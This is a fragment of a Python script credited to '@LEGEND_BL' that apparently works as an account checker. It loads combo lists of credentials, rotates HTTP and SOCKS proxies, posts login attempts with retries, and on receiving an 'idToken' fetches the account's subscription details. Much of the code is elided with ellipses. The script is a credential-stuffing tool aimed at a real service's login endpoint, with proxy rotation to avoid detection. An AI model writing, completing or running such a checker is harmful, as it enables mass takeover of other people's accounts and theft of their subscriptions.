...
proxy_file = input(f"{Fore.CYAN}Proxy file (default: proxy.txt): {Style.RESET_ALL}").strip() or "proxy.txt"
# Code By - @LEGEND_BL
def load_combos(fn):
    try:
...
def format_proxy(p):
    ...
    if "://" in p:
        ...
        if protocol in ['socks4', 'socks5', 'socks5h'] and not SOCKS_AVAILABLE:
            print(f"{Fore.YELLOW}[!] SOCKS proxy detected but 'requests[socks]' not installed. Install with: pip install requests[socks]")
            return None
    ...
    while True:
        ...
        for attempt in range(3):
            try:
                ...
                r = s.post(login_url, json=payload, headers=headers, proxies=proxy_dict, timeout=25)
                data = r.json()
                ...
                if "idToken" in data:
                    ...
                    r2 = s.get(sub_url, headers=sub_headers, proxies=proxy_dict, timeout=25)
                    src = r2.text
